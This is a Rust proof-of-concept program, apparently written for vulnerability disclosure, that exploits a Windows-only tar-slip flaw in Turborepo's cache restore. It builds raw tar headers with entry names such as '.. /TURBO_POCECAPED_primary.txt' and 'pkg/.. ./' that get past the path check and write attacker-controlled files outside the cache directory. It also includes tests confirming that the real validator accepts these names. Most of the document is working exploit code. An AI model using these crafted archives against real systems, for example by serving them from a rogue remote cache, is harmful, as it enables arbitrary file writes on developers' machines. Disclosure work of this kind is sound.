//! PoC: Turborepo cache-restore tar-slip via trailing-dot/space (Windows).
//!
//! This binary exercises the REAL `turborepo_cache::cache_archive::CacheReader`
//! from this repository (no vendored copies). A triager can set a breakpoint
//! inside `restore_regular` / `check_path` / `from_system_path` and watch the
//! crafted entry flow through the genuine upstream code.
//!
//! Vulnerable code path (all in THIS repo):
//!   crates/turborepo-cache/src/cache_archive/restore.rs:63  CacheReader::restore
//!   crates/turborepo-cache/src/cache_archive/restore.rs:183 restore_entry
//!   crates/turborepo-cache/src/cache_archive/restore_regular.rs:21  from_system_path
//!   crates/turborepo-cache/src/cache_archive/restore_regular.rs:22  anchor.resolve
//!   crates/turborepo-cache/src/cache_archive/restore_regular.rs:45  open_for_restore
//!   crates/turborepo-paths/src/anchored_system_path_buf.rs:153  from_system_path
//!   crates/turborepo-paths/src/lib.rs:152  check_path  <-- the gap
//!
//! WHY THE BYPASS WORKS (Windows only)
//! -----------------------------------
//! `check_path` rejects literal `..`, leading `../`, trailing `/..`, and the
//! substring `/../`. It does NOT reject `.. ` (dot-dot-space) or `.. .`
//! (dot-dot-dot where the last dot is a trailing-dot). On Windows, Win32 path
//! normalization strips trailing dots and spaces from each component, so
//! `sub\.. ` is normalized to `sub\..` -> escapes `sub`. Chaining two such
//! components escapes the cache anchor entirely: arbitrary file write.
//!
//! On Unix the trailing space is a literal filename, so the same entry is
//! harmless there. This binary documents that divergence explicitly.

use std::fs;
use std::io::Write;
use std::path::Path;

use tempfile::tempdir;
use turbopath::{AbsoluteSystemPath, AbsoluteSystemPathBuf};
use turborepo_cache::cache_archive::CacheReader;

/// Write a 512-byte tar header whose name field is set to `name` byte-for-byte,
/// bypassing the `tar` builder's path normalization (which would otherwise
/// reject/rewrite `..`). This mirrors the helper turborepo's own test suite uses
/// (`generate_raw_tar_with_unsafe_path` in restore.rs:296).
fn craft_tar_with_raw_name(name: &str, body: &[u8]) -> Vec<u8> {
    let mut buf: Vec<u8> = Vec::new();
    let mut header = [0u8; 512];

    // name field: first 100 bytes
    let nb = name.as_bytes();
    let n = nb.len().min(100);
    header[..n].copy_from_slice(&nb[..n]);
    header[100..107].copy_from_slice(b"0000644"); // mode
    header[108..115].copy_from_slice(b"0001000"); // uid
    header[116..123].copy_from_slice(b"0001000"); // gid
    let size_str = format!("{:011o}", body.len());
    header[124..135].copy_from_slice(size_str.as_bytes()); // size
    header[136..147].copy_from_slice(b"00000000000"); // mtime
    header[156] = b'0'; // typeflag = regular file
    header[257..263].copy_from_slice(b"ustar\0"); // magic
    header[263..265].copy_from_slice(b"00"); // version

    // checksum (field treated as spaces during computation)
    header[148..156].copy_from_slice(b"        ");
    let checksum: u32 = header.iter().map(|&b| b as u32).sum();
    let cs = format!("{:06o}\0 ", checksum);
    header[148..156].copy_from_slice(cs.as_bytes());

    buf.extend_from_slice(&header);
    buf.extend_from_slice(body);
    let pad = 512 - (body.len() % 512);
    if pad < 512 {
        buf.extend(std::iter::repeat_n(0u8, pad));
    }
    // end-of-archive: two zero blocks
    buf.extend(std::iter::repeat_n(0u8, 1024));
    buf
}

fn run_case(label: &str, entry_name: &str) {
    println!("\n================================================================");
    println!("CASE: {label}");
    println!("  crafted entry name (raw bytes): {:?}", entry_name.as_bytes());
    println!("================================================================");

    // Build the malicious archive exactly as a rogue remote-cache server would
    // serve it.
    let payload = b"attacker-controlled cache body\n";
    let archive = craft_tar_with_raw_name(entry_name, payload);
    let archive_path = std::env::temp_dir().join(format!(
        "poc_tarslip_{}.tar",
        label.chars().filter(|c| c.is_alphanumeric()).collect::<String>()
    ));
    fs::write(&archive_path, &archive).expect("write archive");
    println!("  archive written: {}", archive_path.display());

    // Simulated cache anchor (turborepo passes repo_root as the anchor).
    let anchor_tmp = tempdir().expect("anchor tempdir");
    let anchor_path: AbsoluteSystemPathBuf =
        AbsoluteSystemPathBuf::try_from(anchor_tmp.path()).expect("anchor abs path");
    let anchor: &AbsoluteSystemPath = &anchor_path;
    // The cache restore path expects the anchor to exist; create it.
    anchor.create_dir_all().expect("mkdir anchor");

    // The "escape marker": a file in std::env::temp_dir() that should NEVER be
    // created by a correct restore. We anchor the tempdir UNDER temp_dir() and
    // put the marker directly in temp_dir(), so any escape that climbs above
    // the anchor can be detected at a CI-stable, artifact-upload-friendly path.
    let tmp_root = std::env::temp_dir();
    // marker name is part of the crafted entry's trailing path; see main().
    let escape_marker = tmp_root.join(format!("TURBO_POCECAPED_{label}.txt"));
    let _ = fs::remove_file(&escape_marker);

    println!("  anchor (simulated repo root): {}", anchor.as_str());
    println!("  escape marker (must NOT appear): {}", escape_marker.display());

    // === THE REAL UPSTREAM CALL ===
    // This is the same code path HTTPCache::restore_tar / FSCache::fetch use.
    let mut reader = match CacheReader::from_reader(archive.as_slice(), false) {
        Ok(r) => r,
        Err(e) => {
            println!("  CacheReader::from_reader ERR: {e}");
            println!("  (restore aborted; no write)");
            return;
        }
    };
    println!("  CacheReader::from_reader OK (real turborepo-cache code path entered)");

    match reader.restore(anchor, None) {
        Ok((restored, _manifest)) => {
            println!("  restore() OK. restored entries:");
            for r in &restored {
                println!("    - {:?}", r.as_str());
            }
        }
        Err(e) => {
            println!("  restore() ERR: {e}");
            println!("  (Note: on Unix this is expected for traversal-shaped names because");
            println!("   the literal \".. \" dir doesn't exist. On Windows the trailing space");
            println!("   is stripped by Win32 normalization BEFORE the lookup, so the same");
            println!("   name resolves to the parent dir and the write succeeds.)");
        }
    }

    // Diagnose.
    println!("\n  --- result ---");
    if escape_marker.exists() {
        let got = fs::read_to_string(&escape_marker).unwrap_or_default();
        println!("  !!! ESCAPE CONFIRMED on this platform !!!: {}", escape_marker.display());
        println!("  marker contents: {:?}", got);
        println!("  Attacker-controlled bytes were written OUTSIDE the cache anchor");
        println!("  via the REAL turborepo-cache restore() code path.");
    } else {
        println!("  escape marker not created on this platform.");
        if cfg!(not(windows)) {
            println!("  (Unix: trailing space is a literal filename -> no escape. This is");
            println!("   the expected control result; re-run on Windows for the escape.)");
        }
    }
}

fn main() {
    println!("=== Turborepo cache-restore tar-slip PoC (REAL turborepo-cache code) ===");
    println!("platform: {}", if cfg!(windows) { "WINDOWS" } else { "Unix" });
    println!();
    println!("This binary calls turborepo_cache::cache_archive::CacheReader::restore()");
    println!("directly. Set a breakpoint there to watch the crafted entry flow through");
    println!("the genuine upstream code.");

    // CASE A (PRIMARY): leading ".. /" climbs OUT of the anchor in one hop on
    // Windows. check_path passes this because it does NOT start with "../"
    // literally (it starts with ".. ", dot-dot-space-slash).
    //
    //   crafted entry : ".. /TURBO_POCECAPED_primary.txt"
    //   resolve (unix): <anchor>/.. /TURBO_POCECAPED_primary.txt
    //   Win32 normalize: strips the trailing space of ".. " -> ".."
    //                  -> <anchor>/../TURBO_POCECAPED_primary.txt
    //                  -> <anchor-parent>/TURBO_POCECAPED_primary.txt  = ESCAPE
    run_case("primary", ".. /TURBO_POCECAPED_primary.txt");

    // CASE B: trailing-dot variant (".. .") from a nested dir. Same Win32
    // normalization class (trailing dot stripped).
    run_case("dot", "pkg/.. ./TURBO_POCECAPED_dot.txt");

    // CASE C: chain of two ".. " hops (defence-in-depth demo).
    run_case("chain", "pkg/.. /pkg2/.. /TURBO_POCECAPED_chain.txt");

    // CASE D: single trailing-space component (escapes one dir level on Windows).
    run_case("single", "pkg/.. ");

    println!("\n=== done ===");
    println!("On Windows, any CASE above that prints 'ESCAPE CONFIRMED' is the vuln.");
    println!("On Unix, none should escape (control).");
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Asserts the bypass names are accepted by the REAL turborepo check_path,
    /// via the real from_system_path. This is the non-negotiable claim: the
    /// names pass upstream validation. (On Unix the restore may still fail for
    /// a different reason, but validation ACCEPTS the name.)
    #[test]
    fn real_check_path_accepts_crafted_names() {
        for name in ["sub/.. ", "sub/.. .", "sub/.. /x", "sub/.. /sub/.. /z"] {
            // from_system_path is the exact function restore_regular.rs:21 calls.
            let r = turbopath::AnchoredSystemPathBuf::from_system_path(Path::new(name));
            assert!(
                r.is_ok(),
                "from_system_path should ACCEPT {name:?} (the bug); got {r:?}"
            );
        }
    }

    /// Sanity: obvious traversals ARE still rejected by the real checker, so
    /// the bypass is specifically the trailing dot/space gap.
    #[test]
    fn real_check_path_blocks_obvious_traversal() {
        for name in ["..", "../", "a/..", "a/../b", "/etc/passwd", "../x"] {
            let r = turbopath::AnchoredSystemPathBuf::from_system_path(Path::new(name));
            assert!(r.is_err(), "from_system_path should BLOCK {name:?}, got {r:?}");
        }
    }
}
